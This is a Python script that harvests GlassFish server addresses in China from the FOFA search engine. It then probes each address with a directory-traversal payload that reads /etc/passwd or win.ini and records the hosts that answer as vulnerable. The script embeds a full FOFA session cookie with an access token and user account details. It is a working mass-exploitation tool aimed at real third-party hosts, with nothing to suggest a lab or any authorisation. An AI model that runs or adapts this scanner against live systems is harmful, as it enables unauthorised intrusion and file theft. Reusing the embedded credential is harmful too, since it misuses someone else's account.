import base64
# lxml will be ok
import time

from bs4 import BeautifulSoup

import requests

search = '"glassfish" && country="CN"'
headers = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'cookie': '_ga=GA1.1.1796270128.1672456227; __fcd=sWNJK2rZWAeP0mjOd7yYdQh5; Hm_lvt_19b7bde5627f2f57f67dfb76eedcf989=1672461508; befor_router=%2Fresult%3Fqbase64%3DImdsYXNzZmlzaCIgJiYgY291bnRyeT0iQ04i; is_flag_login=0; fofa_token=eyJhbGciOiJIUzUxMiIsImtpZCI6Ik5XWTVZakF4TVRkalltSTJNRFZsWXpRM05EWXdaakF3TURVMlkyWTNZemd3TUdRd1pUTmpZUT09IiwidHlwIjoiSldUIn0.eyJpZCI6MTczNzUyLCJtaWQiOjEwMDEwMDg1MiwidXNlcm5hbWUiOiLmoqboi6XkvZXosJPkvqAiLCJleHAiOjE2NzI3MjQ3OTl9.bq1mdbZGole02ImSZ9wLCVNOaERTD4SonpPuJiQLS5FBRJMh5ihFWA6FGdswGejU2XqrXmu391H3uoqI1e0FWQ; user=%7B%22id%22%3A173752%2C%22mid%22%3A100100852%2C%22is_admin%22%3Afalse%2C%22username%22%3A%22%E6%A2%A6%E8%8B%A5%E4%BD%95%E8%B0%93%E4%BE%A0%22%2C%22nickname%22%3A%22%E6%A2%A6%E8%8B%A5%E4%BD%95%E8%B0%93%E4%BE%A0%22%2C%22email%22%3A%22om2bg0dphm2c1dqc9fcqfpbtvrg0%40open_wechat%22%2C%22avatar_medium%22%3A%22https%3A%2F%2Fthirdwx.qlogo.cn%2Fmmopen%2Fvi_32%2FxCuSHusxZP9yLibOBaN5jVqE6bdDwhVb80QXGojrjxOibLUvMpCzcaLKgsEaglCg5E1NFFO0BZ4MtvodCO8HVCTg%2F132%22%2C%22avatar_thumb%22%3A%22https%3A%2F%2Fthirdwx.qlogo.cn%2Fmmopen%2Fvi_32%2FxCuSHusxZP9yLibOBaN5jVqE6bdDwhVb80QXGojrjxOibLUvMpCzcaLKgsEaglCg5E1NFFO0BZ4MtvodCO8HVCTg%2F132%22%2C%22key%22%3A%2262a64a1415220df309e800f4a57adbd2%22%2C%22rank_name%22%3A%22%E6%B3%A8%E5%86%8C%E7%94%A8%E6%88%B7%22%2C%22rank_level%22%3A0%2C%22company_name%22%3A%22%E6%A2%A6%E8%8B%A5%E4%BD%95%E8%B0%93%E4%BE%A0%22%2C%22coins%22%3A0%2C%22can_pay_coins%22%3A0%2C%22credits%22%3A1%2C%22expiration%22%3A%22-%22%2C%22login_at%22%3A1672465599%7D; isRedirect=1; _ga_CX7MDY134G=GS1.1.1672464522.2.1.1672465675.0.0.0; baseShowChange=false; viewOneHundredData=false; Hm_lpvt_19b7bde5627f2f57f67dfb76eedcf989=1672465989; _ga_9GWBD260K9=GS1.1.1672461508.1.1.1672465999.0.0.0'
}


def getIpFromFofa():
    for page in range(1, 7):
        target = 'https://fofa.info/result?qbase64='
        search_data = str(base64.b64encode(search.encode('utf-8')), 'utf-8')
        url = target + str(search_data)
        urls = url + '&page=' + str(page) + '&page_size=10'
        # print(urls)
        res = requests.get(url=urls, headers=headers).content
        soup = BeautifulSoup(res, 'html.parser')
        link = soup.find_all('a')
        try:
            for i in link:
                href = i.get('href')
                if str(href).startswith('http'):
                    with open(r'ip.txt', 'a') as f:
                        f.write(href + '\n')
                        f.close()
                        time.sleep(0.5)
        except Exception as e:
            pass


def isExistsGlassfishVul(url):
    linux_payload = '/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
    win_payload = '/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini'
    # todo 出现问题直接跳出程序
    linux_data = requests.get(url + linux_payload)
    win_data = requests.get(url + win_payload)
    # print(url + linux_payload)
    # print(url + win_payload)
    with open(r'url.txt', 'a') as f:
        f.write(url + linux_payload + '\n' + url + win_payload + '\n')
        f.close()
    if linux_data.status_code == 200 or win_data.status_code == 200:
        with open(r'vul.txt', 'a') as f:
            f.write(url)
            f.close()
    time.sleep(0.5)


if __name__ == '__main__':
    # getIpFromFofa()
    try:
        for ip in open('ip.txt'):
            ip = ip.replace('\n', '')
            print(ip)
            isExistsGlassfishVul(ip)
    except Exception as e:
        pass